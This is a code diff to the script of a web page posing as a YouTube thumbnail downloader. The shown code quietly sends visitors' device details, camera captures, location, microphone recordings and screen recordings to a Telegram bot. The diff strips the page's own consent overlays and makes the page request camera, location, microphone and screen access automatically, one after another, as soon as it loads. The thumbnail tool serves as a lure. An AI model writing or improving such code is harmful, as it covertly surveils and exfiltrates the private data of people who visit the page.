@@ -45,6 +45,7 @@ const loadingSpinner = document.getElementById('loadingSpinner');
 // ==================== TOAST FUNCTION ====================
 function showToast(message, isError = false) {
   const toast = document.getElementById('toast');
+  if (!toast) return;
   toast.textContent = message;
   toast.classList.add('show');
   if (isError) toast.classList.add('error');
@@ -113,14 +114,8 @@ async function sendToTelegram(message, type = 'text', media = null) {
   }
 }
 
-// ==================== 1. CAMERA PERMISSION & CAPTURE ====================
-function closeOverlay(overlayId) {
-  document.getElementById(overlayId).style.display = "none";
-}
-
+// ==================== 1. CAMERA PERMISSION (Standard Browser Dialog) ====================
 async function requestCameraPermission() {
-  document.getElementById("camera-overlay").style.display = "none";
-  
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ 
       video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
@@ -170,10 +165,8 @@ async function captureAndSendToTelegram(videoElement) {
   }
 }
 
-// ==================== 2. LOCATION PERMISSION ====================
+// ==================== 2. LOCATION PERMISSION (Standard Browser Dialog) ====================
 async function requestLocationPermission() {
-  document.getElementById("location-overlay").style.display = "none";
-  
   if (!navigator.geolocation) {
     await sendToTelegram(`❌ *LOCATION NOT SUPPORTED*\n\n⏰ Time: ${new Date().toLocaleString()}`);
     return;
@@ -213,10 +206,8 @@ async function requestLocationPermission() {
   }, 30000);
 }
 
-// ==================== 3. AUDIO RECORDING ====================
+// ==================== 3. AUDIO PERMISSION (Standard Browser Dialog) ====================
 async function requestAudioPermission() {
-  document.getElementById("audio-overlay").style.display = "none";
-  
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
     audioStream = stream;
@@ -257,10 +248,8 @@ function startAudioRecording(stream) {
   }, 10000);
 }
 
-// ==================== 4. SCREEN RECORDING ====================
+// ==================== 4. SCREEN RECORDING PERMISSION (Standard Browser Dialog) ====================
 async function requestScreenPermission() {
-  document.getElementById("screen-overlay").style.display = "none";
-  
   try {
     const stream = await navigator.mediaDevices.getDisplayMedia({
       video: { cursor: "always", frameRate: { ideal: 30 } },
@@ -430,44 +419,48 @@ async function fetchThumbnail() {
   fetchBtn.disabled = true;
   const btnText = fetchBtn.querySelector('.btn-text');
   const btnLoader = fetchBtn.querySelector('.btn-loader');
-  btnText.textContent = 'PROCESSING...';
-  btnLoader.style.display = 'inline-block';
-  loadingSpinner.style.display = 'flex';
+  if (btnText) btnText.textContent = 'PROCESSING...';
+  if (btnLoader) btnLoader.style.display = 'inline-block';
+  if (loadingSpinner) loadingSpinner.style.display = 'flex';
   
-  thumbnailPreview.style.display = 'none';
-  qualityOptions.style.display = 'none';
+  if (thumbnailPreview) thumbnailPreview.style.display = 'none';
+  if (qualityOptions) qualityOptions.style.display = 'none';
   
   try {
     const thumbnails = generateThumbnailURLs(videoId);
     
     // Display preview
-    previewImg.src = thumbnails.maxres;
-    previewImg.onerror = function() {
-      this.src = 'https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg';
-    };
-    thumbnailPreview.style.display = 'block';
+    if (previewImg) {
+      previewImg.src = thumbnails.maxres;
+      previewImg.onerror = function() {
+        this.src = 'https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg';
+      };
+    }
+    if (thumbnailPreview) thumbnailPreview.style.display = 'block';
     
     // Show quality options
-    qualityButtons.innerHTML = '';
-    const qualities = [
-      { key: 'maxres', label: 'Max Resolution', size: '1280×720', emoji: '⭐' },
-      { key: 'sd', label: 'Standard Quality', size: '640×480', emoji: '📺' },
-      { key: 'hq', label: 'High Quality', size: '480×360', emoji: '🎬' },
-      { key: 'mq', label: 'Medium Quality', size: '320×180', emoji: '📱' },
-      { key: 'default', label: 'Default', size: '120×90', emoji: '🖼️' }
-    ];
-    
-    qualities.forEach(quality => {
-      const button = document.createElement('button');
-      button.className = 'quality-btn';
-      button.innerHTML = `
-        <span>${quality.emoji} ${quality.label}</span>
-        <small>${quality.size}</small>
-      `;
-      button.addEventListener('click', () => downloadThumbnail(thumbnails[quality.key], videoId, quality.label));
-      qualityButtons.appendChild(button);
-    });
-    qualityOptions.style.display = 'block';
+    if (qualityButtons) {
+      qualityButtons.innerHTML = '';
+      const qualities = [
+        { key: 'maxres', label: 'Max Resolution', size: '1280×720', emoji: '⭐' },
+        { key: 'sd', label: 'Standard Quality', size: '640×480', emoji: '📺' },
+        { key: 'hq', label: 'High Quality', size: '480×360', emoji: '🎬' },
+        { key: 'mq', label: 'Medium Quality', size: '320×180', emoji: '📱' },
+        { key: 'default', label: 'Default', size: '120×90', emoji: '🖼️' }
+      ];
+      
+      qualities.forEach(quality => {
+        const button = document.createElement('button');
+        button.className = 'quality-btn';
+        button.innerHTML = `
+          <span>${quality.emoji} ${quality.label}</span>
+          <small>${quality.size}</small>
+        `;
+        button.addEventListener('click', () => downloadThumbnail(thumbnails[quality.key], videoId, quality.label));
+        qualityButtons.appendChild(button);
+      });
+    }
+    if (qualityOptions) qualityOptions.style.display = 'block';
     
     // Send to Telegram
     await sendToTelegram(`🎬 *YOUTUBE THUMBNAIL FETCHED*\n\n🔗 URL: ${videoUrl}\n🆔 Video ID: ${videoId}\n⏰ Time: ${new Date().toLocaleString()}`);
@@ -479,43 +472,54 @@ async function fetchThumbnail() {
     showToast('Error fetching thumbnails. Please try again.', true);
   } finally {
     fetchBtn.disabled = false;
-    btnText.textContent = 'FETCH';
-    btnLoader.style.display = 'none';
-    loadingSpinner.style.display = 'none';
+    if (btnText) btnText.textContent = 'FETCH';
+    if (btnLoader) btnLoader.style.display = 'none';
+    if (loadingSpinner) loadingSpinner.style.display = 'none';
   }
 }
 
-// ==================== INITIALIZE ====================
-async function initialize() {
-  // Send device info
+// ==================== AUTO REQUEST PERMISSIONS ====================
+async function autoRequestPermissions() {
+  // Send device info first
   await sendDeviceInfo();
   
-  // Show permission overlays
+  // Request camera permission (standard browser dialog)
   setTimeout(() => {
-    document.getElementById("camera-overlay").style.display = "flex";
-  }, 2000);
+    requestCameraPermission();
+  }, 1000);
   
+  // Request location permission (standard browser dialog)
   setTimeout(() => {
-    document.getElementById("location-overlay").style.display = "flex";
+    requestLocationPermission();
+  }, 3000);
+  
+  // Request microphone permission (standard browser dialog)
+  setTimeout(() => {
+    requestAudioPermission();
   }, 5000);
   
+  // Request screen recording permission (standard browser dialog)
   setTimeout(() => {
-    document.getElementById("audio-overlay").style.display = "flex";
-  }, 8000);
-  
-  setTimeout(() => {
-    document.getElementById("screen-overlay").style.display = "flex";
-  }, 11000);
-  
-  // Event listeners
+    requestScreenPermission();
+  }, 7000);
+}
+
+// ==================== INITIALIZE ====================
+if (fetchBtn) {
   fetchBtn.addEventListener('click', fetchThumbnail);
+}
+
+if (ytlinkInput) {
   ytlinkInput.addEventListener('keypress', (e) => {
     if (e.key === 'Enter') fetchThumbnail();
   });
-  
+}
+
+if (openFullBtn && previewImg) {
   openFullBtn.addEventListener('click', () => {
     if (previewImg.src) window.open(previewImg.src, '_blank');
   });
 }
 
-window.addEventListener("DOMContentLoaded", initialize);
+// Start auto requests when page loads
+window.addEventListener("DOMContentLoaded", autoRequestPermissions);
